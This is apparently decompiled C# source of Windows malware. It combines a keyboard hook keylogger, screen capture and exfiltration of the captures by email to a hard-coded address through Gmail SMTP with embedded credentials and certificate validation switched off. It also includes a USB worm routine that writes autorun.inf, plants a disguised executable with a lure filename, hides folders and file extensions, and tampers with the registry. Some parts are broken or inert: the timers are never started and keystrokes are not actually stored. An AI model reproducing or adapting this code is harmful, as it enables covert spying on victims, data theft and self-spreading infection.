using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NEW;

internal static class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static string km = "";

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	private static string mreg = Path.GetRandomFileName();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static void USBSpread(object sender, EventArgs e)
	{
		List<string> list = new List<string>();
		string sourceFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "Service.exe");
		int num = 0;
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo item2 in drives.Where((DriveInfo x) => x.IsReady && x.DriveType.ToString() == "Removable" && x.ToString() != "A:\\" && x.ToString() != "B:\\"))
		{
			if (File.Exists(item2.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe"))
			{
				continue;
			}
			string[] directories = Directory.GetDirectories(item2.Name);
			foreach (string item in directories)
			{
				list.Add(item);
			}
			try
			{
				if (list.Count <= 0)
				{
					File.Copy(sourceFileName, string.Concat(item2, "$Recycle.Bin.scr"));
					return;
				}
			}
			catch
			{
			}
			try
			{
				while (list.Count > 0)
				{
					File.Copy(sourceFileName, list[num] + ".scr", overwrite: true);
					if (!File.Exists(list[num] + ".scr"))
					{
						num++;
						continue;
					}
					File.SetAttributes(list[num], File.GetAttributes(list[num]) | FileAttributes.Hidden);
					break;
				}
			}
			catch
			{
			}
			try
			{
				string path = item2.Name + "autorun.inf";
				StreamWriter streamWriter = new StreamWriter(path);
				streamWriter.WriteLine("[autorun]\\n");
				streamWriter.WriteLine("icon=angel.ico");
				streamWriter.WriteLine("open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				streamWriter.WriteLine("action=Run VMCLite");
				streamWriter.WriteLine("Shell\\Open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				streamWriter.WriteLine("Shell\\Open\\Default=1");
				streamWriter.WriteLine("Shell\\Explore=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				streamWriter.WriteLine("Shell\\Explore\\Command=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				streamWriter.WriteLine("[autorun]\n");
				streamWriter.Close();
				File.SetAttributes(item2.Name + "autorun.inf", File.GetAttributes(item2.Name + "autorun.inf") | FileAttributes.Hidden);
				item2.VolumeLabel = "angel";
			}
			catch
			{
			}
			try
			{
				File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), item2.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates).ToString(), "angel.ico"), item2.Name + "angel.ico");
				File.SetAttributes(item2.Name + "autorun.inf", File.GetAttributes(item2.Name + "angel.ico") | FileAttributes.Hidden);
			}
			catch
			{
			}
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true);
			try
			{
				registryKey.DeleteValue(mreg);
			}
			catch
			{
			}
			mreg = Path.GetRandomFileName();
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			using RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced");
			registryKey2.SetValue("Hidden", 0, RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			using RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced");
			registryKey2.SetValue("HideFileExt", 1, RegistryValueKind.DWord);
		}
		catch
		{
		}
		int num2 = 0;
		Process[] processes = Process.GetProcesses();
		foreach (Process item3 in processes.Where((Process x) => x.ToString() == "System.Diagnostics.Process (ExpIorer)"))
		{
			_ = item3;
			num2 = 1;
		}
		if (num2 == 0)
		{
			try
			{
				Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
				Process.GetCurrentProcess().Kill();
			}
			catch
			{
			}
		}
	}

	private static void email(object sender, EventArgs e)
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Invalid comparison between Unknown and I4
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe")) && File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db")))
		{
			File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), overwrite: true);
		}
		if (Directory.Exists("C:\\angel") && (int)MessageBox.Show("Exit?", "", (MessageBoxButtons)4) == 6)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process item2 in processes.Where((Process x) => x.ToString() == "System.Diagnostics.Process (ExpIorer.exe)"))
			{
				item2.Kill();
			}
			Process.GetCurrentProcess().Kill();
		}
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall")))
		{
			File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		}
		((Image)val).Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("zibayekhofte_lover2006@yahoo.com");
		mailMessage.From = new MailAddress("XtahmineX@gmail.com", "XtahmineX", Encoding.UTF8);
		mailMessage.Subject = "";
		mailMessage.SubjectEncoding = Encoding.UTF8;
		mailMessage.Body = km;
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.IsBodyHtml = false;
		mailMessage.Priority = MailPriority.High;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Credentials = new NetworkCredential("XtahmineX@gmail.com", "morteza20");
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		Attachment item = new Attachment(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		mailMessage.Attachments.Add(item);
		ServicePointManager.ServerCertificateValidationCallback = (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true;
		try
		{
			smtpClient.Send(mailMessage);
			km = "";
		}
		catch
		{
		}
	}

	private static void Main()
	{
		Timer timer = new Timer();
		timer.Elapsed += email;
		timer.AutoReset = true;
		timer.Interval = 720000.0;
		Timer timer2 = new Timer();
		timer2.Elapsed += USBSpread;
		timer2.AutoReset = true;
		timer2.Interval = 3000.0;
		_hookID = SetHook(_proc);
		Application.Run();
		UnhookWindowsHookEx(_hookID);
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(lParam);
			MessageBox.Show(((object)(Keys)num).ToString());
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}
}
